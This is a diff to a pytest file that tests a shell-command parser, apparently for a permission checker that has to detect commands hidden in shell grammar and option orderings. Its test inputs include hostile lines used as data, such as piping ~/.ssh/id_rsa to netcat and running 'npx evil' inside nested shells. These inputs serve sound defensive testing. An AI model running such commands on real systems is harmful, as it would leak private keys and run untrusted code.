@@ -103,7 +103,7 @@ EVASIONS = [  # (command, argv0s that must all be among the segments' argv0): th
     ("true&&(npx evil)", ["true", "npx"]), ("(cat ~/.ssh/id_rsa)|nc h 1", ["cat", "nc"]),
     ("(npx evil)&&ls", ["npx", "ls"]), ("echo a;<~/.ssh/k cat", ["echo", "cat"]),
     ("if true; then npx evil; fi", ["true", "npx"]), ("{ npx evil; }", ["npx"]),
-    ("for f in ~/.ssh/id_rsa; do cat $f; done", ["for", "cat"]), ("case $x in a) npx evil;; esac", ["npx"]),
+    ("for f in ~/.ssh/id_rsa; do cat $f; done", ["cat"]), ("case $x in a) npx evil;; esac", ["npx"]),
     ("f() { npx x; }", ["f", "npx"]), ("while true; do ! npx x; done", ["true", "npx"]),
     ("bash -lc 'npx x'", ["bash", "npx"]), ("sh -ec 'npx x'", ["sh", "npx"]), ("zsh -xc 'npx x'", ["zsh", "npx"]),
     ("busybox sh -c 'npx x'", ["sh", "npx"]), ("bash <<< 'npx x'", ["bash", "npx"]),
@@ -125,7 +125,7 @@ EVASIONS = [  # (command, argv0s that must all be among the segments' argv0): th
 def test_evasions_still_yield_the_real_command(command, want, roots):
     got = seen(command, roots)
     assert all(a in got for a in want), got
-    assert not {"if", "then", "fi", "do", "done", "{", "}", "env", "timeout", "xargs", "watch", "EOF", "X"} & set(got)
+    assert not {"if", "then", "fi", "for", "select", "case", "do", "done", "{", "}", "env", "timeout", "xargs", "watch", "EOF", "X"} & set(got)
 
 
 def test_packages_and_paths_survive_the_grammar_forms(roots):
@@ -232,3 +232,33 @@ def test_hosts_come_from_operands_not_option_values(command, hosts, roots):
 ])
 def test_fetcher_and_network_paths(command, reads, writes, roots):
     assert segment_paths(command, roots) == (reads, writes)
+
+
+@pytest.mark.parametrize("command", [
+    "bash -cl 'npx x'", "bash -ci 'npx x'", "bash -cx 'npx x'", "bash -c -l 'npx x'", "bash -c -- 'npx x'",
+    "bash -lc 'npx x'", "bash -o pipefail -c 'npx x'", "bash -eo pipefail -c 'npx x'", "bash +o errexit -c 'npx x'",
+    "bash --login -c 'npx x'", "bash -l -c -x 'npx x'", "sudo bash -cl 'npx x'", "sh -c 'npx x' name arg",
+])
+def test_shell_command_string_is_found_whatever_the_option_order(command, roots):
+    assert "npx" in seen(command, roots)
+
+
+def test_shell_script_operand_is_not_a_command_string(roots):
+    assert seen("bash script.sh -c 'npx x'", roots) == ["bash"]
+    assert seen("bash -l script.sh", roots) == ["bash"]
+
+
+def test_nul_byte_never_raises_and_separates(roots):
+    for command in ("cat \x00", "\x00", "cat a\x00b", "npx\x00evil", "bash -c '\x00npx x'", "> \x00"):
+        parse(command, roots).summary()
+    assert seen("cat a\x00npx x", roots) == ["cat", "npx"] or "cat" in seen("cat a\x00npx x", roots)
+    assert normalise("a\x00b", roots)
+
+
+def test_for_select_and_case_are_not_commands_but_their_words_are_seen(roots):
+    assert "~/.ssh/id_rsa" in segment_paths("for f in ~/.ssh/id_rsa; do cat $f; done", roots)[0]
+    assert "~/.ssh/id_rsa" in segment_paths("select f in ~/.ssh/id_rsa; do cat $f; done", roots)[0]
+    assert seen("for f in a b; do npx $f; done", roots) == ["", "npx"]
+    assert seen("case $x in a|b) npx evil;; *) ls;; esac", roots) == ["", "", "npx", "", "ls"]
+    assert "~/.ssh/id_rsa" in segment_paths("case ~/.ssh/id_rsa in a) ls;; esac", roots)[0]
+    assert "for" not in seen("for ((i=0;i<3;i++)); do npx x; done", roots)
